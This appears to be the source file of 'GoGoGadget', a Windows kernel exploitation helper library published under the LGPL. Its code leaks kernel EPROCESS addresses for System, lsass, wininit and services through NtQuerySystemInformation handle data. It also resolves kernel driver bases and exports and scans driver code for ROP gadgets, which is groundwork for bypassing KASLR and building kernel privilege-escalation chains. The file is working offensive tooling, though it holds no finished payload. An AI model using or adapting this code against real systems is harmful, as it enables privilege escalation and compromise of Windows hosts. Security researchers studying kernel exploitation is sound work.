/**
*
* GoGoGadget - kernel exploitation helper class
*
* Copyright (c) 2016 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1739
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <algorithm>
#include <iterator>
#include "GoGoGadget.h"

GoGoGadget::GoGoGadget()
{
	char tmpEnviron[256] = { 0 };
	GetEnvironmentVariableA("SystemRoot", tmpEnviron, sizeof(tmpEnviron));
	m_systemRoot = tmpEnviron;
	createPidNameMapping();
}

std::string GoGoGadget::convertNtPath(char* path) const
{
	if (_strnicmp(path, "\\SystemRoot\\", sizeof("\\SystemRoot\\") - 1) == 0)
	{
		return m_systemRoot + "\\" + (path + sizeof("\\SystemRoot\\") - 1);
	}
	else
		return path;
}

void GoGoGadget::applyPERelocations(uint8_t* module, uint64_t imageBase)
{
	struct Reloc
	{
		uint16_t offset : 12;
		uint16_t type : 4;
	};
	// no sanity checks, beware!
	IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)module;
	IMAGE_NT_HEADERS64* ntHdr = (IMAGE_NT_HEADERS64*)(module + dosHdr->e_lfanew);
	DWORD oldProt;
	VirtualProtect(module, ntHdr->OptionalHeader.SizeOfImage, PAGE_READWRITE, &oldProt);
	if (0 != ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
	{
		void* maxAddr = module + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(module + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		while (reloc < maxAddr)
		{
			Reloc* r = (Reloc*)(reloc + 1);
			for (int i = 0; i < (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(Reloc); i++)
			{
				switch (r[i].type)
				{
					case IMAGE_REL_BASED_DIR64:
					{
						*(uint64_t*)(module + reloc->VirtualAddress + r[i].offset) -= ntHdr->OptionalHeader.ImageBase;
						*(uint64_t*)(module + reloc->VirtualAddress + r[i].offset) += imageBase;
					}
					break;
					case IMAGE_REL_BASED_ABSOLUTE: break;
					default:
						printf("unkown reloc: %d %d\n", r[i].type, r[i].offset);
				}
			}
			reloc = (IMAGE_BASE_RELOCATION*)((uint8_t*)reloc + reloc->SizeOfBlock);
		}
	}
	VirtualProtect(module, ntHdr->OptionalHeader.SizeOfImage, oldProt, &oldProt);
}

bool GoGoGadget::iterateExecutableNonDiscardableSections(uint8_t* module, uint64_t imageBase, std::function<bool(uint64_t base, uint8_t* ptr, size_t size)> f)
{
	applyPERelocations(module, imageBase);
	// no sanity checks, beware!
	IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)module;
	IMAGE_NT_HEADERS64* ntHdr = (IMAGE_NT_HEADERS64*)(module + dosHdr->e_lfanew);
	IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHdr);
	for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++)
	{
		if (sections[i].Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE))
		{
			if (!(sections[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE))
			{
				if (f(imageBase + sections[i].VirtualAddress, module + sections[i].VirtualAddress, sections[i].SizeOfRawData))
					return true;
			}
		}
	}
	return false;
}

void GoGoGadget::resolveExports(std::string& moduleName, uint8_t* module, uint64_t imageBase, const std::vector<std::pair<std::string, std::string>>& apiNames)
{
	// no sanity checks, beware!
	IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)module;
	IMAGE_NT_HEADERS64* ntHdr = (IMAGE_NT_HEADERS64*)(module + dosHdr->e_lfanew);
	if (0 != ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
	{
		IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(module + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		uint32_t* AddressOfFunctions = (uint32_t*)(module + exports->AddressOfFunctions);
		uint32_t* AddressOfNames = (uint32_t*)(module + exports->AddressOfNames);
		uint16_t* AddressOfNameOrdinals = (uint16_t*)(module + exports->AddressOfNameOrdinals);
		size_t foundApis = 0;
		for (DWORD i = 0; i < exports->NumberOfNames; i++)
		{
			for (auto& an : apiNames)
			{
				if (an.first.compare((char*)module + AddressOfNames[i]) == 0)
				{
					m_foundSymbols[an.second] = imageBase + AddressOfFunctions[AddressOfNameOrdinals[i]];
					foundApis++;
					printf("Found api: %s!%s %0I64X\n", moduleName.c_str(), an.first.c_str(), m_foundSymbols[an.second]);
					if (foundApis == apiNames.size())
						return;
				}
			}
		}
	}
}

void GoGoGadget::leakEprocessInfo()
{
	nt::SYSTEM_HANDLE_INFORMATION_EX dummy = { 0 };
	ULONG len = sizeof(dummy);
	nt::NtQuerySystemInformation(nt::SystemExtendedHandleInformation, &dummy, len, &len);
	nt::SYSTEM_HANDLE_INFORMATION_EX* handles = (nt::SYSTEM_HANDLE_INFORMATION_EX*)malloc(2 * len);
	if (nullptr == handles)
		return;

	std::unordered_map<uint32_t, SmartHANDLE> pids;
	for (auto p : m_pids)
	{
		pids.emplace(std::make_pair(p, SmartHANDLE(OpenProcess(SYNCHRONIZE, FALSE, p), CloseHandle)));
	}

	std::set<uint64_t> zeroAccessEproc;
	std::set<uint64_t> winInitEproc;
	if (NT_SUCCESS(nt::NtQuerySystemInformation(nt::SystemExtendedHandleInformation, handles, 2 * len, &len)))
	{
		const uint32_t ObjectTypeProcess = handles->Handles[0].ObjectTypeIndex;
		size_t foundEPROCESSes = 0;
		for (int i = 0; i < handles->NumberOfHandles; i++)
		{
			if (handles->Handles[i].ObjectTypeIndex != ObjectTypeProcess)
				continue;

			if ((handles->Handles[i].UniqueProcessId == 4) &&
				(handles->Handles[i].GrantedAccess == 0))
			{
				zeroAccessEproc.insert((uint64_t)handles->Handles[i].Object);
			}

			if ((handles->Handles[i].UniqueProcessId == 4) && (handles->Handles[i].HandleValue == 4))
			{
				m_specialSymbols[SystemProcessType::System] = (uint64_t)handles->Handles[i].Object;
			}

			if (_wcsicmp(m_pidToName[(uint32_t)handles->Handles[i].UniqueProcessId].c_str(), L"wininit.exe") == 0)
			{
				winInitEproc.insert((uint64_t)handles->Handles[i].Object);
			}


			if (handles->Handles[i].UniqueProcessId != GetCurrentProcessId())
				continue;

			for (auto& ph : pids)
			{
				if (ph.second.get() == (HANDLE)handles->Handles[i].HandleValue)
				{
					printf("Found EPROCESS for pid(%d): %0I64X\n", ph.first, (uint64_t)handles->Handles[i].Object);
					m_foundSymbols["PID:" + std::to_string(ph.first)] = (uint64_t)handles->Handles[i].Object;
					foundEPROCESSes++;
					if (foundEPROCESSes == m_pids.size())
						break;
				}
			}

			if (foundEPROCESSes == m_pids.size())
				break;
		}
	}

	std::set<uint64_t> servicesExe;
	std::set_intersection(zeroAccessEproc.begin(), zeroAccessEproc.end(), winInitEproc.begin(), winInitEproc.end(), std::inserter(servicesExe, servicesExe.begin()));
	if (servicesExe.size() == 1)
	{
		m_specialSymbols[SystemProcessType::Services] = *servicesExe.begin();
	}
	
	std::set<uint64_t> wininitExe;
	std::set_difference(zeroAccessEproc.begin(), zeroAccessEproc.end(), servicesExe.begin(), servicesExe.end(), std::inserter(wininitExe, wininitExe.begin()));
	if (wininitExe.size() == 1)
	{
		m_specialSymbols[SystemProcessType::Wininit] = *wininitExe.begin();
	}

	std::set<uint64_t> lsassExe;
	std::set_difference(winInitEproc.begin(), winInitEproc.end(), servicesExe.begin(), servicesExe.end(), std::inserter(lsassExe, lsassExe.begin()));
	if (lsassExe.size() == 1)
	{
		m_specialSymbols[SystemProcessType::Lsass] = *lsassExe.begin();
	}
}

void GoGoGadget::stats()
{
	ULONG len = 0;
	nt::NtQuerySystemInformation(nt::SystemModuleInformation, nullptr, 0, &len);
	SmartPtr<nt::RTL_PROCESS_MODULES> modules((nt::RTL_PROCESS_MODULES*)std::malloc(2 * len), std::free);
	if (nullptr == modules)
		return;

	if (NT_SUCCESS(nt::NtQuerySystemInformation(nt::SystemModuleInformation, modules.get(), 2 * len, &len)))
	{
		std::unordered_map<std::string, uint32_t> gadgetStats;
		for (ULONG i = 0; i < modules->NumberOfModules; i++)
		{
			//printf("%s %p\n", modules->Modules[i].FullPathName, modules->Modules[i].ImageBase);
			std::string moduleName((char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName);
			std::transform(moduleName.begin(), moduleName.end(), moduleName.begin(), ::tolower);

			HMODULE hMod = LoadLibraryExA(convertNtPath((char*)modules->Modules[i].FullPathName).c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
			if (0 == hMod)
				continue;

			iterateExecutableNonDiscardableSections((uint8_t*)((uintptr_t)hMod & -4), (uint64_t)modules->Modules[i].ImageBase, [&](uint64_t base, uint8_t* ptr, size_t size) -> bool
			{
				for (uint32_t j = 0; j < size; j++)
				{
					for (auto& g : m_gadgets)
					{
						for (auto& cg : g.second)
						{
							if (memcmp(ptr + j, cg.data(), cg.size()) == 0)
							{
								gadgetStats[g.first]++;
							}
						}
					}
				}
				return false;
			});

			FreeLibrary(hMod);
		}

		for (auto& s : gadgetStats)
		{
			printf("%s: %d\n", s.first.c_str(), s.second);
		}
	}
}

bool GoGoGadget::resolveGadgets(uint8_t* hMod, uint64_t imageBase, size_t& foundGadgetsCnt)
{
	return !iterateExecutableNonDiscardableSections(hMod, imageBase, [&](uint64_t base, uint8_t* ptr, size_t size) -> bool
	{
		for (uint32_t j = 0; j < size; j++)
		{
			for (auto& g : m_gadgets)
			{
				if (m_foundSymbols.find(g.first) != m_foundSymbols.end())
					continue;

				for (auto& cg : g.second)
				{
					if (memcmp(ptr + j, cg.data(), cg.size()) != 0)
						continue;

					m_foundSymbols[g.first] = base + j;
					foundGadgetsCnt++;
					printf("Found gadget %s %0I64X\n", g.first.c_str(), m_foundSymbols[g.first]);
					if (foundGadgetsCnt == m_gadgets.size())
					{
						return true;
					}
				}
			}
		}
		return false;
	});
}

void GoGoGadget::go()
{
	leakEprocessInfo();

	ULONG len = 0;
	nt::NtQuerySystemInformation(nt::SystemModuleInformation, nullptr, 0, &len);
	SmartPtr<nt::RTL_PROCESS_MODULES> modules((nt::RTL_PROCESS_MODULES*)std::malloc(2 * len), std::free);
	if (nullptr == modules)
		return;

	if (NT_SUCCESS(nt::NtQuerySystemInformation(nt::SystemModuleInformation, modules.get(), 2 * len, &len)))
	{
		bool gadgetSearchActive = true;
		size_t driversFoundCnt = 0;
		size_t foundGadgetsCnt = 0;
		for (ULONG i = 0; i < modules->NumberOfModules; i++)
		{
			//printf("%s %p\n", modules->Modules[i].FullPathName, modules->Modules[i].ImageBase);
			std::string moduleName((char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName);
			std::transform(moduleName.begin(), moduleName.end(), moduleName.begin(), ::tolower);

			auto m = m_drivers.find(moduleName);
			if (m != m_drivers.end())
			{
				m_foundSymbols[moduleName] = (uint64_t)modules->Modules[i].ImageBase;
				printf("Found module %s %0I64X\n", moduleName.c_str(), m_foundSymbols[moduleName]);
				driversFoundCnt++;
			}
			
			bool moduleNameApiSearchActive = m_apis.find(moduleName) != m_apis.end();

			if ((driversFoundCnt == m_drivers.size()) &&
				!gadgetSearchActive &&
				!moduleNameApiSearchActive)
				break;

			if (gadgetSearchActive || moduleNameApiSearchActive)
			{
				HMODULE hMod = LoadLibraryExA(convertNtPath((char*)modules->Modules[i].FullPathName).c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
				if (0 == hMod)
					continue;

				if (moduleNameApiSearchActive)
				{
					resolveExports(moduleName, (uint8_t*)((uintptr_t)hMod & -4), (uint64_t)modules->Modules[i].ImageBase, m_apis.at(moduleName));
				}

				if (gadgetSearchActive)
				{
					gadgetSearchActive = resolveGadgets((uint8_t*)((uintptr_t)hMod & -4), (uint64_t)modules->Modules[i].ImageBase, foundGadgetsCnt);
				}

				FreeLibrary(hMod);
			}
		}
	}
}

uint32_t GoGoGadget::getProcessPid(const char* processName) const
{
	std::string procNameA(processName);
	auto it = m_nameToPid.find(std::wstring(procNameA.begin(), procNameA.end()));
	if (it == m_nameToPid.end())
		return 0;
	return it->second;
}

void GoGoGadget::createPidNameMapping()
{
	SmartHANDLE tlhlp(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0), CloseHandle);
	if (INVALID_HANDLE_VALUE == tlhlp.get())
		return;

	PROCESSENTRY32 procEntry = { 0 };
	procEntry.dwSize = sizeof(procEntry);
	if (!Process32First(tlhlp.get(), &procEntry))
		return;

	do
	{
		m_pidToName[procEntry.th32ProcessID] = procEntry.szExeFile;
		m_nameToPid.insert(std::pair<std::wstring, uint32_t>(procEntry.szExeFile, procEntry.th32ProcessID));
	} while (Process32Next(tlhlp.get(), &procEntry));
}

void GoGoGadget::addApi(const char* moduleName, const char* apiName, const char* symbolName)
{
	std::string modName(moduleName);
	std::transform(modName.begin(), modName.end(), modName.begin(), ::tolower);
	std::string symName = nullptr == symbolName ? modName + apiName : symbolName;
	auto m = m_apis.find(modName);
	if (m == m_apis.end())
	{
		m_apis[modName].emplace_back(std::make_pair(apiName, symName));
	}
	else
	{
		m->second.emplace_back(std::make_pair(apiName, symName));
	}
}

void GoGoGadget::addModule(const char* moduleName)
{
	std::string modName(moduleName);
	std::transform(modName.begin(), modName.end(), modName.begin(), ::tolower);
	m_drivers.emplace(modName);
}

void GoGoGadget::addGadget(GadgetType type)
{
	std::string internalName = gadgetName(type);
	for (auto& g : s_internalGadgets.at(type))
	{
		addGadget(internalName.c_str(), g.data(), g.size());
	}
}

void GoGoGadget::addGadget(const char* gadgetName, const std::vector<uint8_t>& gadgetBody)
{
	auto g = m_gadgets.find(gadgetName);
	if (g == m_gadgets.end())
	{
		m_gadgets[gadgetName].emplace_back(gadgetBody);
	}
	else
	{
		g->second.emplace_back(gadgetBody);
	}
}

void GoGoGadget::addGadget(const char* gadgetName, const uint8_t* gadgetBody, size_t gadgetSize)
{
	addGadget(gadgetName, std::vector<uint8_t>(gadgetBody, gadgetBody + gadgetSize));
}

void GoGoGadget::addProcess(const char* processName)
{
	uint32_t pid = getProcessPid(processName);
	if (0 != pid)
		addProcess(pid);
}

void GoGoGadget::addProcess(uint32_t pid)
{
	m_pids.emplace(pid);
}

uint64_t GoGoGadget::getSymbol(uint32_t pid) const
{
	return getSymbol("PID:" + std::to_string(pid));
}

uint64_t GoGoGadget::getSymbol(GadgetType type) const
{
	return getSymbol(gadgetName(type).c_str());
}

uint64_t GoGoGadget::getSymbol(const char* symbolName) const
{
	return getSymbol(std::string(symbolName));
}

uint64_t GoGoGadget::getSymbol(const std::string& symbolName) const
{
	auto s = m_foundSymbols.find(symbolName);
	if (s == m_foundSymbols.end())
		s = m_foundSymbols.find("PID:" + std::to_string(getProcessPid(symbolName.c_str())));
	return s == m_foundSymbols.end() ? 0 : s->second;
}

uint64_t GoGoGadget::getSymbol(const char* moduleName, const char* apiName) const
{
	return getSymbol(std::string(moduleName) + apiName);
}

uint64_t GoGoGadget::getSymbol(SystemProcessType processType) const
{
	auto s = m_specialSymbols.find(processType);
	return s == m_specialSymbols.end() ? 0 : s->second;
}
